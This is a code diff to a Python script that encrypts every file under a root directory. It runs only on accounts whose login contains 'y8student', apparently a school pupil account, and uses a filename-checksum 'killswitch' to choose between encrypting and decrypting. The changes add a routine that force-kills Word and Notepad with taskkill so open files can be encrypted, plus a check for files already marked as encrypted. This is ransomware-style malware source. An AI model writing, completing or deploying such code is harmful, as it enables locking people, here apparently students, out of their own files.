@@ -91,7 +91,7 @@ def hex_to_dir():
             p += "/" + folders.pop(0)
             this_subdir = os.path.normpath(p)
             if not os.path.exists(this_subdir):
-                os.system(f'mkdir "{this_subdir}"')
+                os.mkdir(this_subdir)
             
             
         
@@ -113,6 +113,8 @@ def encrypt():
     dump_data = dump()
 
     cryp_fns = ""
+
+    close_progs()
     
     for subdir, dirs, files in os.walk(rootdir):
         for file in files:
@@ -150,6 +152,11 @@ def encrypt():
     print()
     input("Press any key to exit.")
 
+def close_progs():
+
+    for prog in ["winword.exe", "notepad.exe"]:
+        os.system(f'taskkill /IM "{prog}" /F >nul 2>&1')
+
 def decrypt():
     try:
         f = open('dump')
@@ -168,13 +175,19 @@ def decrypt():
 def go():    
     
     if "y8student" not in os.getlogin():
+        input("Forbidden.")
         exit()
+    
+              
     from random import randint
     chk = sum(ord(i) for i in __file__.split("\\")[-1])
     print(chk)
     print(__file__.split("\\")[-1])
 
     if chk != 570: # killswitch
+        if any([f.startswith("ENCRYPTED") for f in os.listdir(rootdir)]):
+            input("Some/all of your files have already been encrypted.")
+            exit()
         encrypt()
     else:
         decrypt()
